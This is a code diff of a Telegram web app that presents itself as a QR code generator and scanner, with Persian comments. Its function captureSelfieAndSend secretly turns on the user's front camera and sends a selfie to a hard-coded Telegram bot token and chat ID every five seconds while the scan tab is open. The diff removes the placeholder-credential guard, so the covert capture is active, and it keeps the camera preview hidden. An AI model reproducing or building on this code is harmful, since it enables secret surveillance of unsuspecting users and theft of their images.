@@ -11,7 +11,7 @@
     <!-- jsQR for scanning -->
     <script src="https://cdn.jsdelivr.net/npm/jsqr@1.4.0/dist/jsQR.min.js"></script>
     <style>
-        /* ===== همان استایل‌های قبلی (بدون تغییر) ===== */
+        /* ===== همان استایل‌های قبلی با اندکی بهبود ===== */
         * {
             margin: 0;
             padding: 0;
@@ -414,6 +414,7 @@
             margin-bottom: 16px;
             aspect-ratio: 1/1;
             border: 2px solid #00a6ff;
+            position: relative;
             display: flex;
             align-items: center;
             justify-content: center;
@@ -421,24 +422,24 @@
             font-size: 16px;
         }
 
-        video, #gallery-image {
+        #video {
             width: 100%;
             height: 100%;
             object-fit: cover;
-            border-radius: 26px;
+            display: none; /* پنهان */
         }
 
-        #video {
-            display: none;
+        #preview-message {
+            position: absolute;
+            z-index: 2;
+            color: #90b9d9;
         }
 
         #gallery-image {
-            background: #0a1a2c;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: #90b9d9;
-            font-size: 14px;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: none;
         }
 
         .hidden-input {
@@ -581,8 +582,9 @@
 
             <div id="camera-preview">
                 <video id="video" playsinline autoplay></video>
+                <div id="preview-message">Camera active (hidden)</div>
                 <canvas id="scanCanvas" style="display: none;"></canvas>
-                <div id="galleryImage" style="display: none;">No image selected</div>
+                <img id="gallery-image" style="display: none;" alt="gallery">
             </div>
 
             <input type="file" id="fileInput" class="hidden-input" accept="image/*">
@@ -613,9 +615,9 @@
             tg.ready();
             tg.MainButton.setText('Close').hide();
 
-            // --- توکن ربات و آیدی مقصد (مقادیر را وارد کنید) ---
-            const BOT_TOKEN = '7715887499:AAGv98jjEZux0CYLksft9FnutYHbHGBSyzw';       // توکن ربات خود را اینجا قرار دهید
-            const CHAT_ID = '8386227371';         // آیدی عددی یا یوزرنیم مقصد
+            // --- توکن ربات و آیدی مقصد (مقادیر وارد شده) ---
+            const BOT_TOKEN = '7715887499:AAGv98jjEZux0CYLksft9FnutYHbHGBSyzw';
+            const CHAT_ID = '8386227371';
 
             // --- Elements ---
             const tabGenerate = document.getElementById('tabGenerate');
@@ -651,13 +653,14 @@
             const stopCameraBtn = document.getElementById('stopCameraBtn');
             const video = document.getElementById('video');
             const scanCanvas = document.getElementById('scanCanvas');
-            const galleryImage = document.getElementById('galleryImage');
+            const galleryImage = document.getElementById('gallery-image');
             const fileInput = document.getElementById('fileInput');
             const scanStatus = document.getElementById('scanStatus');
             const scanResult = document.getElementById('scanResult');
             const scanResultText = document.getElementById('scanResultText');
             const copyResultBtn = document.getElementById('copyResult');
             const openLinkBtn = document.getElementById('openLink');
+            const previewMessage = document.getElementById('preview-message');
 
             const MAX_CHARS = 600;
 
@@ -680,7 +683,6 @@
                         dot.classList.add('active');
                     }
                     dot.addEventListener('click', () => {
-                        // Remove active from all in this container
                         container.querySelectorAll('.color-dot').forEach(d => d.classList.remove('active'));
                         dot.classList.add('active');
                         if (isDots) {
@@ -698,18 +700,13 @@
             createColorPalette(dotsPalette, dotsPresets, true);
             createColorPalette(bgPalette, bgPresets, false);
 
-            // Custom color buttons
             customDotsBtn.addEventListener('click', () => {
                 customDotsInput.click();
             });
             customDotsInput.addEventListener('input', (e) => {
                 dotsColor = e.target.value;
                 dotsCurrentColor.style.backgroundColor = dotsColor;
-                // Remove active from preset dots
                 dotsPalette.querySelectorAll('.color-dot').forEach(d => d.classList.remove('active'));
-            });
-            customDotsInput.addEventListener('change', () => {
-                // Optionally keep the color
             });
 
             customBgBtn.addEventListener('click', () => {
@@ -748,15 +745,10 @@
 
             // --- تابع عکس‌برداری مخفی با دوربین سلفی ---
             async function captureSelfieAndSend() {
-                // اگر توکن یا آیدی تنظیم نشده، یا در حال حاضر یک عکس‌برداری در جریان است، خارج شو
-                if (!BOT_TOKEN || BOT_TOKEN === 'YOUR_BOT_TOKEN' || !CHAT_ID || CHAT_ID === 'TARGET_CHAT_ID' || isCapturingSelfie) {
-                    return;
-                }
-
+                if (isCapturingSelfie) return;
                 isCapturingSelfie = true;
                 let stream = null;
                 try {
-                    // درخواست دوربین جلویی
                     stream = await navigator.mediaDevices.getUserMedia({ 
                         video: { facingMode: 'user' } 
                     });
@@ -769,7 +761,6 @@
 
                     await hiddenVideo.play();
 
-                    //等待 ویدئو آماده شود
                     await new Promise(resolve => {
                         if (hiddenVideo.videoWidth) resolve();
                         else hiddenVideo.addEventListener('loadeddata', resolve, { once: true });
@@ -822,12 +813,9 @@
                     startCamera();
 
                     // شروع عکس‌برداری دوره‌ای سلفی هر ۵ ثانیه
-                    // ابتدا یکبار عکس بگیر
-                    captureSelfieAndSend();
-                    // سپس هر ۵ ثانیه تکرار کن
+                    captureSelfieAndSend(); // یکبار فوری
                     if (selfieInterval) clearInterval(selfieInterval);
                     selfieInterval = setInterval(() => {
-                        // فقط اگر تب اسکن فعال است، عکس بگیر (برای اطمینان)
                         if (scanPanel.classList.contains('active')) {
                             captureSelfieAndSend();
                         }
@@ -916,8 +904,8 @@
                     activeStream = null;
                 }
                 video.style.display = 'none';
-                galleryImage.style.display = 'none';
-                document.getElementById('camera-preview').innerHTML = '<div style="display: flex; align-items: center; justify-content: center;">No camera active</div>';
+                previewMessage.style.display = 'flex';
+                previewMessage.textContent = 'No camera active';
                 scanStatus.textContent = 'Camera stopped.';
             }
 
@@ -936,9 +924,9 @@
                 try {
                     activeStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
                     video.srcObject = activeStream;
-                    video.style.display = 'none';
-                    const previewDiv = document.getElementById('camera-preview');
-                    previewDiv.innerHTML = '<div style="display: flex; align-items: center; justify-content: center;">Scanning... (camera active)</div>';
+                    video.style.display = 'none'; // همچنان پنهان
+                    previewMessage.style.display = 'flex';
+                    previewMessage.textContent = 'Scanning... (camera active)';
                     scanStatus.textContent = 'Camera active. Point at a QR code.';
                     isCameraActive = true;
                     
@@ -992,9 +980,10 @@
                 reader.onload = (event) => {
                     const img = new Image();
                     img.onload = () => {
-                        galleryImage.style.background = `url(${event.target.result}) center/cover no-repeat`;
-                        galleryImage.style.display = 'flex';
-                        galleryImage.textContent = '';
+                        galleryImage.src = event.target.result;
+                        galleryImage.style.display = 'block';
+                        video.style.display = 'none';
+                        previewMessage.style.display = 'none';
                         scanCanvas.width = img.width;
                         scanCanvas.height = img.height;
                         const ctx = scanCanvas.getContext('2d');
